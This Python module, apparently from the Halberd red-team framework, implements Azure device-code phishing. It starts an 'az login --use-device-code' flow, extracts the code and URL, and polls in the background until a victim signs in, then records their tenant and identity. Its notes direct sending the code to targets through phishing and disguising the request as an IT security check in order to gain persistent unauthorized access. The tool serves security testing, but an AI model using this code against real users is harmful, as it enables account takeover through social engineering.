from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique, TechniqueReference, TechniqueNote
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.azure.azure_access import AzureAccess
from core.output_manager.output_manager import OutputManager
import subprocess
import json
import time
import re
from multiprocessing import Process

def extract_device_code_info(raw_output):
    """Extract device login URL and user code from Azure CLI output."""
    if not raw_output:
        return None

    user_code = None
    verification_url = None

    user_code_patterns = [
        r"enter the code\s+([A-Z0-9-]+)",
        r"user code[:\s]+([A-Z0-9-]+)",
    ]

    for pattern in user_code_patterns:
        match = re.search(pattern, raw_output, re.IGNORECASE)
        if match:
            user_code = match.group(1).strip().rstrip(".,;:")
            break

    urls = re.findall(r"https://[^\s]+", raw_output, re.IGNORECASE)
    cleaned_urls = [url.rstrip(").,;:") for url in urls]
    preferred_urls = [url for url in cleaned_urls if "device" in url.lower()]
    if preferred_urls:
        verification_url = preferred_urls[0]
    elif cleaned_urls:
        verification_url = cleaned_urls[0]

    if user_code and verification_url:
        return {
            "user_code": user_code,
            "verification_url": verification_url
        }

    return None

def monitor_device_code_authentication(az_command, az_env, technique_name, event_id, device_code_data, timeout_seconds):
    """Background process to monitor device code authentication completion"""
    start_time = time.time()
    print(f"[AzureEstablishAccessViaDeviceCode] Starting authentication monitoring for device code: {device_code_data.get('user_code', 'Unknown')}")
    
    while time.time() - start_time < timeout_seconds:
        try:
            # Check if authentication has completed by testing a simple Azure CLI command
            result = subprocess.run(
                [az_command, "account", "show"], 
                capture_output=True, 
                text=True, 
                timeout=10,
                env=az_env
            )
            
            if result.returncode == 0:
                # Authentication successful - get account info
                try:
                    account_info = json.loads(result.stdout)
                    OutputManager().store_technique_output(
                        data={
                            "instruction": "Authentication completed successfully and the Azure CLI session is now available to Halberd.",
                            "authentication_status": "authenticated",
                            "verification_url": device_code_data.get("verification_url"),
                            "user_code": device_code_data.get("user_code"),
                            "tenant_id": account_info.get("tenantId", "Unknown"),
                            "subscription_name": account_info.get("name", "Unknown"),
                            "subscription_id": account_info.get("id", "Unknown"),
                            "identity": account_info.get("user", {}).get("name", "Unknown"),
                            "identity_type": account_info.get("user", {}).get("type", "Unknown")
                        },
                        technique_name=technique_name,
                        event_id=event_id
                    )
                    print(f"[AzureEstablishAccessViaDeviceCode] Authentication successful for user: {account_info.get('user', {}).get('name', 'Unknown')}")
                    print(f"[AzureEstablishAccessViaDeviceCode] Tenant: {account_info.get('tenantId', 'Unknown')}")
                    print(f"[AzureEstablishAccessViaDeviceCode] Subscription: {account_info.get('name', 'Unknown')}")
                    return True
                except json.JSONDecodeError:
                    OutputManager().store_technique_output(
                        data={
                            "instruction": "Authentication completed successfully, but Halberd could not parse the Azure CLI account details.",
                            "authentication_status": "authenticated",
                            "verification_url": device_code_data.get("verification_url"),
                            "user_code": device_code_data.get("user_code"),
                            "raw_output": result.stdout.strip()
                        },
                        technique_name=technique_name,
                        event_id=event_id
                    )
                    print("[AzureEstablishAccessViaDeviceCode] Authentication successful (could not parse account details)")
                    return True
                
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, Exception) as e:
            # Authentication not complete, continue monitoring
            pass
            
        # Wait before next check
        time.sleep(10)
    
    OutputManager().store_technique_output(
        data={
            "instruction": "Authentication did not complete before the monitoring window expired.",
            "authentication_status": "timeout",
            "verification_url": device_code_data.get("verification_url"),
            "user_code": device_code_data.get("user_code"),
            "timeout_seconds": timeout_seconds
        },
        technique_name=technique_name,
        event_id=event_id
    )
    print(f"[AzureEstablishAccessViaDeviceCode] Authentication monitoring timed out after {timeout_seconds} seconds")
    return False

@TechniqueRegistry.register
class AzureEstablishAccessViaDeviceCode(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1078.004",
                technique_name="Valid Accounts",
                tactics=["Defense Evasion", "Persistence", "Privilege Escalation", "Initial Access"],
                sub_technique_name="Cloud Accounts"
            )
        ]
        
        azure_trm_technique = [
            AzureTRMTechnique(
                technique_id="AZT201.1",
                technique_name="Valid Credentials",
                tactics=["Initial Access"],
                sub_technique_name="User Account"
            )
        ]
        
        technique_references = [
            TechniqueReference(
                "Azure CLI Device Code Authentication", 
                "https://learn.microsoft.com/en-us/cli/azure/authenticate-azure-cli#sign-in-with-a-web-browser"
            ),
            TechniqueReference(
                "OAuth 2.0 Device Authorization Grant", 
                "https://tools.ietf.org/html/rfc8628"
            )
        ]
        
        technique_notes = [
            TechniqueNote("This technique requires the target user to manually complete the device code authentication flow using the provided URL and code"),
            TechniqueNote("The device code remains valid for approximately 15 minutes by default, providing a reasonable window for user interaction"),
            TechniqueNote("Use this technique in phishing campaigns by sending the device code URL and user code to target users via email or messaging"),
            TechniqueNote("Monitor the authentication status using the built-in background process - successful authentication will be detected automatically"),
            TechniqueNote("The technique establishes persistent access to Azure resources through the Azure CLI authentication token"),
            TechniqueNote("Combine with social engineering to increase success rate - present the authentication request as a legitimate IT security verification"),
            TechniqueNote("Once authenticated, the session persists until explicit logout or token expiration")
        ]
        
        super().__init__(
            "Establish Access via Device Code Flow", 
            "Initiates Azure CLI device code authentication flow to gain unauthorized access to Azure resources through user credential theft. This technique leverages the OAuth 2.0 device authorization grant flow, which is commonly used for devices without web browsers or with limited input capabilities. The technique generates a user-friendly device code and verification URL that can be easily shared with target users through phishing campaigns or social engineering attacks. Once the target user visits the verification URL and enters the device code, the technique automatically detects successful authentication and establishes persistent access to the user's Azure environment. This attack vector is particularly effective because the device code flow appears legitimate to users and is commonly used in enterprise environments for CLI tool authentication. The technique includes background monitoring to detect authentication completion and provides detailed session information upon successful access establishment.", 
            mitre_techniques, 
            azure_trm_technique,
            references=technique_references,
            notes=technique_notes
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            tenant_id: str = kwargs.get('tenant_id', None)
            timeout_minutes: int = kwargs.get('timeout_minutes', 15)
            event_id: str = kwargs.get('_event_id')
            
            if timeout_minutes in [None, ""]:
                timeout_minutes = 15 # Set default if no value found

            # Validate timeout
            if timeout_minutes <= 0 or timeout_minutes > 60:
                timeout_minutes = 15  # Set default value
            
            # Get Azure CLI command
            azure_access = AzureAccess()
            az_command = azure_access.az_command
            az_env = azure_access.get_subprocess_env()
            
            if not az_command:
                return ExecutionStatus.FAILURE, {
                    "error": "Azure CLI not found",
                    "message": "Azure CLI is not installed or not accessible"
                }
            
            # Prepare device code authentication command
            device_code_cmd = [az_command, "login", "--use-device-code"]
            
            # Update device code authentication command if tenant id provided
            if tenant_id:
                device_code_cmd.extend(["--tenant", tenant_id])
            
            # Allow authentication without subscription access
            device_code_cmd.append("--allow-no-subscriptions")
            
            # Start the device code authentication process in non-blocking mode
            process = subprocess.Popen(
                device_code_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True,
                env=az_env
            )
            
            # Read initial output to get device code information
            device_code_info = None
            user_code = None
            verification_url = None
            
            # Wait for device code information
            start_time = time.time()
            output_lines = []
            
            while time.time() - start_time < 10:  # Wait max 10 seconds for device code info
                try:
                    # Check if process is still running
                    if process.poll() is not None:
                        break
                        
                    # Try to read from stderr
                    line = process.stdout.readline()
			
                    if line:
                        output_lines.append(line.strip())
                        
                        extracted_info = extract_device_code_info(line)
                        if extracted_info:
                            user_code = extracted_info["user_code"]
                            verification_url = extracted_info["verification_url"]
                            device_code_info = extracted_info
                            break
                            
                except Exception as e:
                    print(f"Error reading process output: {str(e)}")
                    continue
                    
                # Small delay to prevent excessive CPU usage
                time.sleep(0.1)
            
            # If we couldn't get device code info, attempt extraction from collected output
            if not device_code_info and output_lines:
                full_output = "\n".join(output_lines)
                device_code_info = extract_device_code_info(full_output)
                if device_code_info:
                    user_code = device_code_info["user_code"]
                    verification_url = device_code_info["verification_url"]
            
            # If still no device code info, return failure
            if not device_code_info:
                # Terminate the process
                try:
                    process.terminate()
                    process.wait(timeout=5)
                except:
                    process.kill()
                    
                return ExecutionStatus.FAILURE, {
                    "error": "Could not extract device code information",
                    "message": "Failed to get device code and verification URL from Azure CLI",
                }
            
            # Start background monitoring process to complete authentication
            timeout_seconds = timeout_minutes * 60
            monitoring_process = Process(
                target=monitor_device_code_authentication,
                args=(az_command, az_env, self.__class__.__name__, event_id, device_code_info, timeout_seconds)
            )
            monitoring_process.start()
            
            # Return device code information as technique output
            return ExecutionStatus.SUCCESS, {
                "message": "Azure device code authentication flow initiated successfully",
                "value": {
                    "instruction": "Send the verification URL and user code to the target user. Authentication will be monitored automatically.",
                    "verification_url": verification_url,
                    "user_code": user_code,
                    "note": f"The device code is valid for {timeout_minutes} minutes. Halberd will update the stored execution output when authentication is detected.",
                    "timeout_minutes": timeout_minutes,
                    "monitoring": "Background process started to monitor authentication status",
                    "target_tenant": tenant_id
                }
            }
            
        except subprocess.TimeoutExpired:
            return ExecutionStatus.FAILURE, {
                "error": "Command timeout",
                "message": "Azure CLI command timed out during device code initiation"
            }
        except json.JSONDecodeError as e:
            return ExecutionStatus.FAILURE, {
                "error": f"JSON parsing error: {str(e)}",
                "message": "Failed to parse Azure CLI response"
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to initiate Azure device code authentication"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "tenant_id": {
                "type": "str", 
                "required": False, 
                "default": None, 
                "name": "Tenant ID (Optional)", 
                "input_field_type": "text"
            },
            "subscription_id": {
                "type": "str", 
                "required": False, 
                "default": None, 
                "name": "Subscription ID (Optional)", 
                "input_field_type": "text"
            },
            "timeout_minutes": {
                "type": "int", 
                "required": False, 
                "default": 15, 
                "name": "Authentication Timeout (in minutes)", 
                "input_field_type": "number"
            }
        }
